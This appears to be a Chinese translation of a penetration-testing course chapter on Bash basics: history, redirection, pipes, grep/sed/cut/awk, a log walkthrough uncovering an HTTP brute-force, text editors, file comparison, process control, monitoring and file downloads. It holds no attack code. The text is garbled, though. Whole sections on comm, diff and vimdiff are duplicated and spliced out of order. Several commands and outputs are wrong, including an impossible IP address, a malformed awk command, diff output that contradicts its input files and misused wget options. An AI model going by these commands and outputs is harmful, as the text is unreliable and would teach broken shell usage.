+ls Desktop/
+ls Desktop/
+```
+
+> 列表 33 - 在 Bash 中演示 Tab 补全
+
+当我们在 "D" 之后第一次按下 Tab 键时，bash shell 会建议三个以该字符开头的目录，然后向我们展示部分完成的命令以便我们继续。由于我们指定了 "Desktop"，我们继续输入 "e" 然后再次按下 Tab 键。此时，bash 会自动补全 "Desktop" 的剩余部分，因为它是唯一以 "De" 开头的。关于 Tab 补全更多信息可以在 Debian 网站上找到。
+
+### 3.1.3 Bash 历史
+
+在渗透测试期间，记录输入 shell 的命令是非常重要的。幸运的是，Bash 维护了已输入命令的历史，可以使用 `history` 命令显示。
+
+```
+kali@kali:-$ history
+1 cat /etc/lsb-release
+2 clear
+3 history
+```
+
+> 列表 34 - `history` 命令
+
+与其从历史记录中重新输入长命令，我们可以利用历史扩展功能。例如，回看列表 34，历史记录中有三个命令，每个命令前面都有行号。要重新运行第一个命令，我们只需输入 `!` 后跟行号（在本例中为 1），即可执行 `cat /etc/lsb-release` 命令：
+
+```
+kali@kali:-$ !1
+cat /etc/lsb-release
+DISTRIB_ID=Kali
+DISTRIB_RELEASE=kali-rolling
+DISTRIB_COAME=kali-rolling
+DISTRIB_DESCRIPTION="Kali GNU/Linux Rolling"
+```
+
+> 列表 35 - 历史扩展的应用
+
+另一个有快捷键是 `!!`，它重复我们在终端会话期间执行的上一个命令：
+
+```
+kali@kali:- sudo systemctl restart apache2
+kali@kali:- !!
+sudo systemctl restart apache2
+kali@kali:-$
+```
+
+> 列表 36 - 轻松重复上一个命令
+
+默认情况下，命令历史保存到用户主目录。环境变量 `bash_history` 控制命令历史的大小：`HISTSIZE` 和 `HISTFILE`。
+
+`HISTSIZE` 控制存储在当前会话内存中的命令数量，`HISTFILE` 配置历史文件中保留的命令数量。这些变量可以根据需要进行编辑，并保存到稍后我们将探索的 Bash 配置文件 `.bashrc` 中。
+
+探索 Bash 历史最简单的方法之一直接通过命令行提示符。我们可以通过两种最常用的方法浏览历史记录：
+
+- 向后滚动历史
+
+- 向前滚动历史
+
+最后但同样重要的，按下 `Ctrl+R` 将调用反向搜索功能。输入一个字母，例如 c，你将获得历史中包含字母 "c" 的最新命令的匹配项。继续输入以缩小搜索范围，当找到所需的命令时，按回车键执行它。
+
+## 3.1.2 练习
+
+- 检查你的 bash 历史记录，并使用历史扩展（history expansion）重新运行其中的命令。
+
+- 执行你选择的命令，并尝试通过快捷键以及反向搜索功能（reverse-i search）浏览历史。
+
+## 3.2 管道与重定向
+
+命令行执行的每个程序都连接着三个数据流，作为与外部环境通信的通道。这些流定义如下：
+
+| 流名称 | 描述 |
+
+|---|---|
+
+| 标准输入 (`STDIN`) | 输入到程序的数据 |
+
+| 标准输出 (`STDOUT`) | 程序的输出（默认到终端） |
+
+| 标准错误 (`STDERR`) | 错误信息（默认到终端） |
+
+管道（使用 `|`）和重定向（使用 `<` 和 `>` 运算符）将程序和文件之间的流连接起来，以适应近乎无限可能的场景。
+
+## 3.2.1 重定向到新文件
+
+在之前的命令示例中，输出是打印在屏幕上的。这很方便，但我们可以使用 `>` 运算符将输出保存到文件中，以便日后参考或处理：
+
+```
+kali@:- ls
+Desktop Documents Downloads Pictures Public Templates Videos
+kali@:- echo "test"
+test
+kali@:- echo "test" > redirection_test.txt
+kali@:- ls
+Desktop Documents Downloads Pictures Public redirection_test.txt Template
+kali@:- cat redirection_test.txt
+test
+kali@:- echo "Kali Linux is an open source project" > redirection_test.txt
+kali@:- cat redirection_test.txt
+Kali Linux is an open source project
+```
+
+# 攻击性安全
+
+使用 Kali Linux 2.0 进行渗透测试
+
+如列表 38 所示，如果我们将输出重定向到一个不存在的文件，该文件将被自动创建。然而，如果我们输出输出到一个已经存在的文件，该文件的内容将被替换。请小心重定向！没有撤销功能。
+
+## 3.2.2 重定向到现有文件
+
+要向文件追加额外数据（而不是覆盖文件），请使用 `>>` 运算符：
+
+
+
+```
+kali@kali:-$ echo "that is maintained and funded by Offensive Security" >> redirection_test.txt
+```
+
+```
+kali@kali:-$ cat redirection_test.txt
+Kali Linux is an open source project
+that is maintained and funded by Offensive Security
+```
+
+> 列表 39 - 将输出重定向到现有文件
+
+## 3.2.3 从文件重定向
+
+正如你猜的样，我们可以使用 `<` 运算符向“反方向”发送数据。在以下示例中，我们将 `wc` 命令的 STDIN 数据重定向自之前会话中生成的文件。让我们尝试 `wc -m`，它可以统计文件中的字符数：
+
+```
+kali@kali:-$ wc < redirection_test.txt
+89
+```
+
+> 列表 40 - 使用 < 运算符为 wc 命令提供输入
+
+注意，这种效果“连接”了文件内容到我们 `wc -m` 命令的标准输入。
+
+## 3.2.4 重定向 STDERR
+
+根据 POSIX 规范，STDIN、STDOUT 和 STDERR 的文件描述符分别定义为 0、1 和 2。这些数字非常重要，因为它们可以在执行或组合不同命令时，从命令行操作对应的数据流。
+
+为了更好地掌握文件描述符的工作，请考虑这个重定向标准错误 `STDERR` 的示例：
+
+```
+kali@kali:-$ ls .
+Desktop Documents Music Public redirection_test.txt Template
+```
+
+```
+kali@kali:-$ ls /test
+ls: cannot access '/test': no such file or directory
+```
+
+```
+kali@kali:-$ ls /test 2>error.txt
+```
+
+```
+kali@kali:-$ cat error.txt
+ls: cannot access '/test': no such file or directory
+```
+
+54 (Wikipedia, 2019), https://en.wikipedia.org/wiki/File_descriptor
+
+55 (Wikipedia, 2019), https://en.wikipedia.org/wiki/File_descriptor
+
+PWK 2.0 Copyright © Offensive Security Ltd. All rights reserved. 54
+
+# 列表 41 - 将 STERR 重定向到文件
+
+在列表 41 中，`error.txt` 包含了错误信息（生成在 STERR）。我们通过将流重定向到文件实现了这一点。
+
+## 3.2.5 管道
+
+继续使用 `wc` 命令示例，看看如何将一个命令的输出重定向到另一个命令的输入：
+
+```
+kali@kali:~ cat error.txt
+: cannot access '/test/; No such file or directory
+
+kali@kali:~ cat error.txt | wc -m
+53
+
+kali@kali:~ cat error.txt | wc -m > count.txt
+53
+```
+
+# 列表 42 - 将 cat 命令的输出管道至 wc
+
+在列表 42 中，使用了管道字符 (`|`) 将 `cat` 命令的输出重定向到 `wc` 的输入。这个概念看似简单，但管道命令是处理各种数据的强大工具。
+
+## 3.2.5.1 练习
+
+- 1. 使用 `cat` 命令结合 `sort` 重新排序 Kali Linux 系统上的 `/etc/passwd` 文件。
+- 2. 将练习输出重定向到家目录下的任意文件。
+
+## 3.3 搜索与处理
+
+在本节中，我们将通过引入几个命令：`grep`、`sed` 和 `awk` 来提高文本处理的效率。这些工具的高级用法需要理解正则表达式 `regex`。正则表达式是描述搜索模式的特殊字符串。如果你不熟悉正则表达式，请访问以下 URL：
+
+- http://www.regexx.com/
+- http://www.regular-expressions.info/
+
+## 3.3.1 grep
+
+简而言之，`grep` 在文本文件中搜索给定正则表达式的出现，并将任何匹配的行输出到标准输出（通常是屏幕）。最常用的选项包括 `-r`（递归搜索）和 `-i`（忽略大小写）。考虑以下示例：
+
+```
+kali: -la /usr/bin | grep zip
+-rwxr-xr-x 3 root 34480 Jan 29 2017
+-rwxr-xr-x 3 root 34480 Jan 29 2017
+-rwxr-xr-x 1 root 13864 Jan 29 2017
+-rwxr-xr-x 1 root 10517 Mar 14 2016
+```
+
+> 列表 43: 在 `/usr/bin` 中搜索包含 "zip" 的文件
+
+在列表 43 中，我们使用 `ls` 列出 `/usr/bin` 目录下的所有文件，并管道至 `grep` 命令以搜索包含字符串 "zip" 的行。了解如何使用它。
+
+## 3.3.2 sed
+
+`sed` 是一个强大的编辑器。它也非常复杂，因此我们将从很高的层次进行简单介绍。`sed` 对文本流进行编辑，或对一组文件进行编辑。来看这个示例：
+
+```
+kali: - echo "I need to try hard" | sed 's/hard/harder/'
+```
+
+> 列表 44: 替换输出中的单词
+
+在列表 44 中，我们使用 `echo` 命令创建一个文本流，然后管道至 `sed` 以将单词 "hard" 替换为 "harder"。注意，输出默认自动重定向到标准输出。
+
+## 3.3.3 cut
+
+`cut` 命令很简单，但通常很有用。它用于从行中提取部分文本，最常用的选项包括 `-f`（字段数）和 `-d`（字段分隔符）。
+
+```
+kali: - echo "binaries,mobile apps, and just else" | cut -f 2 -d ","
+```
+
+> 列表 45: 从命令输出中提取字段
+
+在列表 45 中，我们 `echo` 了一行文本并管道至 `cut`，使用逗号 `,` 作为字段分隔符提取第二个字段。相同的命令可以用于文件中的行，如下所示，通过使用 `:` 作为分隔符并检索第一个字段，从 `/etc/passwd` 中提取用户列表：
+
+```
+kali: - cut -d ":" -f 1 /etc/passwd
+root
+```
+
+57 (GNU, 2018), https://www.gnu.org/software/manual.html
+
+58 (die.net, 2010), https://linux.die.net/man/
+
+## 3.3.4 awk
+
+`AWK` 是一种为文本处理设计的编程语言，通常用数据提取和报告工具。它非常强大且可能相当复杂，而我们只触及表面。`awk` 的一个常用选项是 `-F`，它是字段分隔符，以及 `print` 命令，它输出结果：
+
+```
+kali@kali~$ echo "hello:friend" | awk -F ": '{print $1, $3}'
+hello friend
+```
+
+列表 47 - 在 `awk` 中使用多字符分隔符从流中提取字段
+
+在列表 47 中，我们 `echo` 了一行并管道至 `awk` 以提取作为字段分隔符的 `($1)` 和 `($3)` 字段。我们使用的 `cut` 和 `awk` 示例之间最显著的区别是，`cut` 只能接受单个字符作为字段分隔符，而如列表 47 所示的 `awk` 要灵活得多。作为一个经验法则，当你开始进行多次 `cut` 操作时，可以切换到 `awk`。
+
+## 3.3.5 实例
+
+让我们来看一个结合了我们为止探索的命令的实际示例。我们得到了 Apache 服务器日志（http://www.offensive-security.com/pwk-files/access_log.gz），其中包含了攻击证据。我们的任务是使用 Bash 命令检查文件并发现各种信息，例如攻击者是谁以及服务器上到底发生了什么。
+
+首先，我们将使用 `head` 和 `wc` 命令快速查看日志以找到结构。`head` 命令显示文件的前 10 行，`wc` 命令配合 `-l` 选项显示文件的总行数：
+
+```
+kali@kali~$ gunzip access_log.txt.gz
+kali@kali~$ mv access_log.txt access_log
+access_log
+201.21.11.44 - [25/Apr/2013:14:05:35 -0700] GET /favicon.ico HTTP/1.1 404 89 "-"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.37 (HTML, like Gecko) Chrome/26.0.0.1410.64 Safari/537.37 "-random-site"
+```
+
+
+
+# 攻击安全 (OFFENSIVE SECURITY)
+
+www.offensive-security.com
+
+# 使用 Kali Linux 2.0 进行渗透测试
+
+```
+kali@kali:$- wc -l access.log
+1173 access.log
+```
+
+## 列表 48 - 查看日志文件以理解其结构
+
+注意，日志文件是基于文本的，并包含了不同的字段（IP 地址、HTTP 请求等），这些字段由空格分隔。这是一个非常“对 `grep` 友好”的世界，很好地适用于我们目前为止涵盖的所有工具。我们将开始通过搜索发送到服务器的 HTTP 请求，查找日志中记录的所有 IP 地址。我们将通过将 `cat` 命令的输出传递给 `cut` 和 `sort` 命令来实现。这可能会为我们提供关于需要处理的潜在攻击者数量的线索。
+
+```
+kali@kali:$- cat access.log | cut -d " " -f 1 | sort -u
+208.115.113.91
+208.54.234.99
+70.194.129.34
+72.133.474.242
+88.112.192.2
+98.238.123.95
+99.127.177.95
+```
+
+## 列表 49 - 管道命令以从文件中获取所需信息
+
+我们看到日志文件中记录的 IP 地址少于十个，尽管这还没有告诉我们关于攻击者的任何信息。接下来，我们使用 `uniq` 和 `sort` 来显示哪些唯一的行，进一步完善我们的输出，并根据每个 IP 地址访问服务器的次数对数据进行排序。`uniq` 的 `-c` 选项会在输出行前加上出现次数。
+
+```
+kali@kali:$- cat access.log | cut -d " " -f 1 | uniq -c | sort -urn
+1038 208.68.234.99
+59 208.115.113.91
+22 208.54.80.240
+21 99.127.177.95
+8 78.194.129.34
+1 208.21.152.44
+```
+
+## 列表 50 - 使用 `uniq` 命令获取文件中每个 IP 地址的计数
+
+有几个 IP 地址脱颖而出，但我们首先关注频率最高的攻击者。为了过滤 `208.68.234.99` 地址并显示该 IP 请求的资源，我们使用以下序列：
+
+```
+kali@kali:$- cat access.log | grep '208.68.234.99' | cut -d '""' -f 2 | uniq -c
+1038 // admin HTTP/1.1
+```
+
+## 列表 51 - 探索特定 IP 地址访问的资源
+
+从此输出中，我们看到 IP `208.68.234.99` 仅访问了 `/admin` 目录。让我们进一步检查：
+
+```
+kali@kali:$- cat access.log | grep '208.68.234.99' | grep '/admin ' | sort -u
+208.68.234.99 - [22/Apr/2013:07:51:20 -0500] GET //HTTP/1.1 401 742 "-"-Teh
+208.68.234.99 - admin [22/Apr/2013:07:51:25 -0500] GET //HTTP/1.1 200 575 "-"
+```
+
+"Teh Forest Lobster"
+
+```
+kali@kali:~ $ access.log|grep '208.68.234.99' | grep -v '/admin '
+kali@kali:~$
+```
+
+## 列表 52 - 仔细查看日志文件
+
+异常情况下，`208.68.234.99` 出现在一次针对此服务器的 HTTP 暴力破解尝试中。此外，在 1000 次尝试之后，暴力破解似乎成功了，正如“HTTP 200”消息所示。
+
+### 3.3.1 练习题
+
+- 使用 `/etc/passwd`，提取你的 Kali 机器上所有被设置为 `/bin/false` 的用户的用户名和主目录字段。确保你使用 Bash 单行命令将输出打印到屏幕上。输出应该类似于列表 53：
+
+```
+kali:~$ 你的命令在这里../nonexistent
+The user mysql home directory is /nonexistent
+The user Debian-snap home directory is /var/lib/snmp
+The user speech-dispatcher home directory is /var/run/speech-dispatcher
+The user Debian-gdm home directory is /var/lib/gdm3
+```
+
+## 列表 53 - 设置为 /bin/false 的用户的目录
+
+- 将 `/etc/passwd` 复制到你的主目录 (`/home/kali`)。使用 `cat` 单行命令打印 `/etc/passwd` 的输出，并将所有的 "Gnome Display Manager" 替换为 "GDM"。
+
+## 3.4 从命令行编辑文件
+
+接下来，让我们来看看命令行环境下的文件编辑。这是一项重要技能，特别是当你在渗透测试中获得 Unix 系统的访问时。虽然有像 `gedit` 和 `leafpad` 这样由于图形界面可能更美观的编辑器，但我们关注强调速度和通用性的文本编辑器。每个人对于文本编辑器似乎都有自己的偏好，但我们将涵盖常用的 `nano` 和 `vi` 的基本用法。
+
+### 3.4.1 nano
+
+`nano` 是最易用的文本编辑器之一。要打开文件并开始编辑，只需运行 `nano` 并传递文件名作为可选参数即可：
+
+## 列表 54 - 使用 nano 编辑器打开文件
+
+文件打开后，我们可以立即开始进行所需的更改，而无需图形编辑器。如图 5 所示，命令菜单位于底部。一些需要记住的最常用命令有：
+
+- `Ctrl O` 将更改写入文件
+- `Ctrl K` 剪切行
+- `Ctrl U` 取消剪切并粘贴到光标处
+- `Ctrl W` 搜索
+- `Ctrl X` 退出
+
+图 5：使用 nano 编辑文件
+
+### 3.4.2 vi
+
+`vi` 是一个极其强大的文本编辑器，在处理重复性任务时具有极快的速度。然而，它的学习曲线相对陡峭，远没有 Nano 简单。由于其复杂性，我们仅涵盖基础知识。与 `nano` 一样，编辑文件只需将其名称作为参数传递即可：
+
+## 列表 55 - 使用 vi 编辑器打开文件
+
+文件打开后，进入插入模式开始打字。要这样做，按下 `I` 键并开始输入。要禁用插入模式返回命令模式，按下 `Esc` 键。在命令模式下使用：
+
+- `dd` 删除当前行
+- `yy` 复制当前行
+- `p` 粘贴剪贴板内容
+- `x` 删除当前字符
+- `:w` 保存文件到磁盘并留在 vi
+- `:wq` 保存并退出
+
+## 3.5 比较文件
+
+文件比较似乎无关，但系统管理员、网络工程师、渗透测试员、IT 支持技术以及许多其他技术人员依赖这项技能。在本节中，我们将查看一些有助于简化通常枯燥但有回报的文件比较过程的工具。
+
+### 3.5.1 comm
+
+`comm` 命令比较两个文件，显示每个文件特有的行以及共同的行。它输出对齐列：第一列包含第一个文件特有的行；第二列包含第二个文件特有的行；第三列包含两个文件共行。`-n` 参数（其中 `-n` 为 1、2 或 3）可以根据需要抑制一个或多个列。让我们来看一个例子：
+
+```
+kali@kali~$ cat scan-a.txt
+92.168.1.1
+92.168.1.2
+```
+
+PWK 2.0 版权 © Offensive Security Ltd. 保留所有。
+
+# 使用 Kali Linux 2.0 进行渗透测试
+
+192.168.1.3
+
+192.168.1.4
+
+192.168.1.5
+
+```
+kali@kali~$ cat scan-b.txt
+192.168.1.1
+192.168.1.3
+192.168.1.4
+192.168.1.5
+192.168.1.6
+```
+
+```
+kali@kali~$ comm scan-a.txt scan-b.txt
+192.168.1.2
+192.168.1.3
+192.168.1.4
+192.168.1.5
+```
+
+```
+kali@kali~$ comm -12 scan-a.txt scan-b.txt
+192.168.1.1
+192.168.1.3
+192.168.1.4
+192.168.1.5
+```
+
+## 列表 56 - 使用 comm 比较文件
+
+在第一个示例中，`comm` 分别显示了 **`scan-a.txt`** 中的唯一行、**`scan-b.txt`** 中的唯一行以及两个文件中都存在的行。在第二个示例中，**`comm -12`** 显示了两个文件中都存在的行，因为我们抑制了第一列和第二列。
+
+### 3.5.2 diff
+
+`diff` 命令⁷ 被用于检测文件之间的差异，类似于 `comm` 命令。然而，`diff` 要复杂得多，并且支持许多输出格式。最受欢迎的两种格式包括上下文格式 `-c` 和**统一**格式 `-u`。列表 57 展示了这两种格式之间的差异：
+
+
+
+### `diff` 命令示例
+
+```
+kali@kali~$ diff -c scan-a.txt scan-b.txt
+*** scan-a.txt 2018-02-07 14:46:21.557861848 -0700
+scan-b.txt 2018-02-07 14:46:44.275002421 -0700
+*****************
+
+*** 1,5 ****
+192.168.1.1
+192.168.1.2
+192.168.1.3
+192.168.1.4
+192.168.1.5
+--- 1—5 ---
+192.168.1.1
+192.168.1.3
+192.168.1.4
+```
+
+> ⁷(die.net, 2002), https://linux.die.net/man/1/diff
+
+```
+kali@kali:~$ diff -u scan-a.txt scan-b.txt
+--- scan-a.txt 2018-02-07 14:46:21.55786148-0700
++++ scan-b.txt 2018-02-07 14:46:44.275002421-0700
+@@ -1,5 +1,5 @@
+192.168.1.1
+-192.168.1.2
++192.168.1.2
+192.168.1.3
+192.168.1.4
++192.168.1.5
+```
+
+列表 57 - 使用 `diff` 比较文件
+
+输出使用 `"-"` 指示符表示该行出现在第一个文件中，但不在第二个文件中。相反，`"+"` 指示符显示该行出现在第二个文件中，但不在第一个文件中。
+
+这些格式之间最显著的区别是，统一格式不显示文件之间匹配的行，使得结果更短。指示符在两种格式中的含义完全相同。
+
+### 3.5.3 `vimdiff`
+
+`vimdiff` 会打开带有多个文件的 `vim`，每个窗口一个文件。文件之间的差异会被高亮显示，这使得更容易在视觉上进行检查。有一些可能有用的快捷键：示例：
+
+- `do` 将当前窗口的更改获取到当前窗口中
+- `dp` 将当前窗口的更改放入另一个窗口中
+- `]c` 跳到下一个更改处
+- `[c` 跳到上一个更改处
+- `Ctrl+W` 切换到另一个分屏窗口
+
+让我们来看一个示例：
+
+```
+kali@kali:-$ vimdiff scan-a.txt scan-b.txt
+```
+
+列表 58 - 使用 `vimdiff` (统一格式) 比较文件
+
+终端 - `scan-a.txt` (~) (1 of 2) - VIM
+
+```
+File Edit View Terminal Tabs Help
+192.168.1.1
+192.168.1.2
+192.168.1.3
+192.168.1.4
+192.168.1.5
+
+192.168.1.1
+192.168.1.3
+192.168.1.4
+192.168.1.5
+
+192.168.1.6
+
+scan-a.txt 1,1 All scan-b.txt
+```
+
+# 使用 Kali Linux 2.0 进行渗透测试
+
+192.168.1.3
+
+192.168.1.4
+
+192.168.1.5
+
+```
+kali@kali~$ cat scan-b.txt
+192.168.1.1
+192.168.1.3
+192.168.1.4
+192.168.1.5
+192.168.1.6
+```
+
+```
+kali@kali~$ comm scan-a.txt scan-b.txt
+192.168.1.2
+192.168.1.3
+192.168.1.4
+192.168.1.5
+```
+
+```
+kali@kali~$ comm -12 scan-a.txt scan-b.txt
+192.168.1.1
+192.168.1.3
+192.168.1.4
+192.168.1.5
+```
+
+列表 56 - 使用 `comm` 比较文件
+
+
+
+在第一个示例中，`comm` 分别显示了 `scan-a.txt` 中的唯一行、`scan-b.txt` 中的唯一行以及两个文件中都存在的行。在第二个示例中，`comm -12` 显示了两个文件中都存在的行，因为我们抑制了第一列和第二列。
+
+## 3.5.2 diff
+
+`diff` 命令⁷ 被用于检测文件之间的差异，类似于 `comm` 命令。然而，`diff` 要复杂得多，并且支持许多输出格式。最受欢迎的两种格式包括上下文格式 (`-c`) 和**统一**格式 (`-u`)。列表 57 展示了这两种格式之间的差异：
+
+```
+kali@kali~$ diff -c scan-a.txt scan-b.txt
+*** scan-a.txt 2018-02-07 14:46:21.557861848 -0700
+scan-b.txt 2018-02-07 14:46:44.275002421 -0700
+*****************
+
+*** 1,5 ****
+192.168.1.1
+192.168.1.2
+192.168.1.3
+192.168.1.4
+192.168.1.5
+--- 1—5 ---
+192.168.1.1
+192.168.1.3
+192.168.1.4
+```
+
+> ⁷(die.net, 2002), https://linux.die.net/man/1/diff
+
+```
+kali@kali:~$ diff -u scan-a.txt scan-b.txt
+--- scan-a.txt 2018-02-07 14:46:21.55786148-0700
++++ scan-b.txt 2018-02-07 14:46:44.275002421-0700
+@@ -1,5 +1,5 @@
+192.168.1.1
+-192.168.1.2
++192.168.1.2
+192.168.1.3
+192.168.1.4
++192.168.1.5
+```
+
+列表 57 - 使用 `diff` 比较文件
+
+输出使用 `"-"` 指示符表示该行出现在第一个文件中，但不在第二个文件中。相反，`"+"` 指示符显示该行出现在第二个文件中，但不在第一个文件中。
+
+这些格式之间最显著的区别是，统一格式不显示文件之间匹配的行，使得结果更短。指示符在两种格式中的含义完全相同。
+
+## 3.5.3 vimdiff
+
+`vimdiff` 会打开带有多个文件的 vim，每个窗口一个文件。文件之间的差异会被高亮显示，这使得更容易在视觉上进行检查。有一些可能有用的快捷键：示例：
+
+- `do` 将当前窗口的更改获取到当前窗口中
+- `dp` 将当前窗口的更改放入另一个窗口中
+- `]c` 跳到下一个更改处
+- `[c` 跳到上一个更改处
+- `Ctrl+W` 切换到另一个分屏窗口
+
+让我们来看一个示例：
+
+```
+kali@kali:-$ vimdiff scan-a.txt scan-b.txt
+```
+
+列表 58 - 使用 `vimdiff` (统一格式) 比较文件
+
+终端 - `scan-a.txt` (~) (1 of 2) - VIM
+
+```
+File Edit View Terminal Tabs Help
+192.168.1.1
+192.168.1.2
+192.168.1.3
+192.168.1.4
+192.168.1.5
+
+192.168.1.1
+192.168.1.3
+192.168.1.4
+192.168.1.5
+
+192.168.1.6
+
+scan-a.txt 1,1 All scan-b.txt
+```
+
+输出使用 `"-"` 指示符表示该行出现在第一个文件中，但不在第二个文件中。相反，`"+"` 指示符显示该行出现在第二个文件中，但不在第一个文件中。
+
+这些格式之间最显著的区别是，统一格式不显示文件之间匹配的行，使得结果更短。指示符在两种格式中的含义完全相同。
+
+`ps` 名称广为人知，以至于在 Windows PowerShell 中，`ps` 是 `Get-Process` 命令的预定义别名，其基本功能相同。
+
+作为渗透测试人员，在获取系统的远程访问后，要检查的任务之一是理解当前受攻击机器上正运行着哪些软件。这可以帮助我们提升权限或收集额外信息，以便进一步进入网络内部。
+
+例如，让我们先启动 Leafpad 编辑器，然后尝试使用 `ps` 命令从命令行查找它的进程 ID（PID）⁷（列表 62）：
+
+```
+kali@kali:$ ps -ef
+UID PID PPID C TIME TTY CMD
+root 1 0 10:18 ? 00:00:02 /sbin/init
+root 2 0 10:18 ? 00:00:00 [kthreadadd]
+root 3 0 10:18 ? 00:00:00 [rcu_gp]
+root 4 0 10:18 ? 00:00:00 [rcu_par_gp]
+root 5 0 10:18 ? 00:00:00 [worker/0-events]
+root 6 0 10:18 ? 00:00:00 [worker/0:0H-kblockd]
+root 7 0 10:18 ? 00:00:00 [worker/u256:0-events_bound]
+root 8 0 10:18 ? 00:00:00 [mm_perpcpu_wq]
+root 9 2 10:18 ? 00:00:00 [ksftirqd/2]
+root 10 0 10:18 ? 00:00:00 [rcu_sched]
+```
+
+列表 62 列出当前运行的进程的 `ps` 命令
+
+- 选择所有进程
+- 使用 (`UID`, `PID`, `PPID`, 等) 显示格式
+
+在庞大的列表中找到我们的 Leafpad 并非容易，但由于我们知道要查找的程序名称，可以将 `-e` 替换为 `-C`（按命令名称选择），如下所示：
+
+```
+kali@kali:$ ps -fc leafpad
+UID PID PPID C TIME TTY CMD
+kali 1307 9 10:57 ? 00:00:00 leafpad
+```
+
+列表 63 通过指定进程名称缩小搜索范围
+
+如列表 63 所示，该进程返回了单一结果，我们从中获取了 Leafpad 的 PID。花点时间研究一下命令手册（`man ps`），因为 `ps` 是进程管理中的“瑞士军刀”。
+
+让我们看看如何在不与 GUI 交互的情况下停止 Leafpad 进程。`kill` 命令可以帮助我们，因为它的目的是向进程发送特定的信号⁷⁴。为了使用 `kill`，我们需要想要发送信号的上一个进程的 PID。既然我们已经在上一步中获取了 Leafpad 的 PID，我们可以继续：
+
+```
+kali@kali:-$ ps aux | grep leadleaf
+kali      1313 0.0 0.0 6144 888 pts/0 S+ 10:59 0:00 grep leadleaf
+```
+
+列表 64：通过发送 `SIGTERM` 停止 `leadpad`
+
+由于默认信号是 `SIGTERM`（终止），我们的应用程序已被终止。这在列表 64 中通过杀死 Leafpad 后使用 `ps` 验证了这一点。
+
+### 3.6.1 练习
+
+1. 通过在后台运行特定命令，找到你的 Kali 虚拟机在过去 7 天内发生变化的文件。
+2. 重新运行上一个命令并将其挂起；挂起后放入后台。
+3. 将上一个后台作业调回前台。
+4. 在你的 Kali 系统上启动 Firefox 浏览器。使用 `ps` 和 `grep` 识别 Firefox 的 PID。
+5. 使用其 PID 从命令行终止 Firefox。
+
+## 3.7 文件和命令监控
+
+在渗透测试过程中，了解如何实时监控文件和命令极具价值。有助于此类任务的两个命令是 `tail` 和 `watch`。
+
+### 3.7.1 tail
+
+`tail`⁷ 最常用的用法是在日志条目写入时进行监控。例如，我们想要监控 Apache 日志以查看 Web 服务器是否被客户端访问，客户端会这样做：
+
+```
+kali@kali:-$ sudo tail -f /var/log/apache2/access.log
+127.0.0.1 - - [02/Feb/2018:12:18:14 -0500] /GET /HTTP/1.1" 200 330 "-" "Mozilla/5.0
+(X11; Linux x86_64; rv=52.0) Gecko/2010011 Firefox/52.0"
+127.0.0.1 - - [02/Feb/2018:12:18:15 -0500] /GET /icons/openapi.png 200 640
+127.0.0.1" "Mozilla/5.0 (X11; Linux x86_64; rv=52.0) Gecko/2010011 Firefox/52.0"
+127.0.0.1 - - [02/Feb/2018:12:18:15 -0500] /GET /favicon.ico 404 500
+127.0.0.1" "Mozilla/5.0 (X11; Linux x86_64; rv=52.0) Gecko/2010011 Firefox/52.0"
+```
+
+列表 65：使用 `tail` 监控 Apache
+
+
+
+`-f` 选项（跟随）非常有用，因为它会随着文件的增长持续更新输出。另一个方便的开关是 `-n`，它输出最后 n 行，而不是默认的 10 行。
+
+### 3.7.2 watch
+
+`watch` 命令用于定期运行指定的命令。默认每秒运行一次，但我们可以使用 `-n` 选项指定不同的间隔。例如，此命令每 5 秒列出一次用户：
+
+```
+kali@kali~$ watch -n 5
+Every 5s: 01:06:03 up 7 days, load average: 0.18,0.09
+USER TTY IDLE CPU COMMAND
+tty1 16Jan 0s /usr/bin/python
+```
+
+列表 66 - 使用 `watch` 命令监控用户
+
+要终止命令并返回交互式终端，请使用 `Ctrl+C`。
+
+### 3.7.2 练习
+
+1. 启动 `apache` 服务并在本地访问，同时监控其 `access.log` 文件。
+
+2. 使用 `watch` 和 `ps` 组合在终端窗口监控 Kali 机器上消耗 CPU 的进程。
+
+## 3.8 下载文件
+
+接下来让我们看看一些从命令行 Linux 系统下载文件的工具。
+
+### 3.8.1 wget
+
+我们将广泛使用 `wget` 命令，通过 HTTP/HTTPS 和 FTP 下载文件。列表 67 显示了使用 `wget` 配合 `-o` 开关在本地机器上以不同的名称保存。
+
+```
+kali@kali~$ wget -o report-wget.pdf https://www.offensive-security.com/reports/penetration-testing-sample-report-2013.pdf
+2018-01-28 23:30:04 Resolving www.offensive-security.com (www.offensive-security.com)...
+Connecting to www.offensive-security.com (www.offensive-security.com)...
+24:54
+HTTP request sent, awaiting response... 200 OK
+Length: 2761955 (263K) [application/pdf]
+Saving to: 'report_wget.pdf'
+100%[====================> 24.61M 766KB/s in 28s 'report_wget.pdf' saved
+```
+
+列表 67 - `wget` 下载文件
+
+### 3.8.2 curl
+
+`curl` 是一个使用主机协议（包括 IMAP/POP3, SCP, SFTP, SMB, SMTP, TELNET, FTP 等）从或向服务器传输数据的工具。渗透测试人员可以使用它下载或上传复杂的请求。它最基本的用法与 `wget` 非常相似，如列表 68 所示：
+
+```
+kali@kali:$ curl -o report.pdf https://www.offensive-security.com/reports/penetration-testing-sample-report-2013.pdf
+% % Received Average Speed Time Current
+      Download Upload Total Spent Left
+100 26.4M 100 26.4M 0 1590k 0:00:17 0:00:17 ---:870k
+```
+
+列表 68 - 使用 `curl` 下载文件
+
+### 3.8.3 axel
+
+`axel` 下载加速器，通过多个连接从 FTP 或 HTTP 服务器传输文件。该工具具有大量功能，但最常用 `-n`，用于指定连接数。在以下示例中，我们还使用了 `-a` 选项来实现简洁的进度指示，并使用 `-o` 为下载的文件指定不同的文件名。
+
+```
+kali@kali:$ axel -a -n 20 -o report_axel.pdf https://www.offensive-security.com/reports/penetration-testing-sample-report-2013.pdf
+Initializing download: https://www.offensive-security.com/reports/penetration-testing-File size: 2769155 bytes
+Opening output file report_axel.pdf
+Starting
+```
+
+```
+Connection 0 finished
+Connection 1 finished
+Connection 2 finished
+Connection 3 finished
+Connection 4 finished
+Connection 5 finished
+Connection 6 finished
+Connection 7 finished
+Connection 8 finished
+Connection 9 finished
+Connection 10 finished
+Connection 11 finished
+Connection 13 finished
+Connection 14 finished
+Connection 15 finished
+Connection 16 finished
+```
+
+⁷² (Wikipedia, 2019), https://en.wikipedia.org/wiki/Process_identifier
+
+⁷³ (Ask Ubuntu, 2014) https://askubuntu.com/questions/484982/what-is-the-difference-between-standard-syntax-and-bsd-syntax
+
+⁷⁴ (Wikipedia, 2019), https://en.wikipedia.org/wiki/Signal(IPC)/POSIX_signals
+
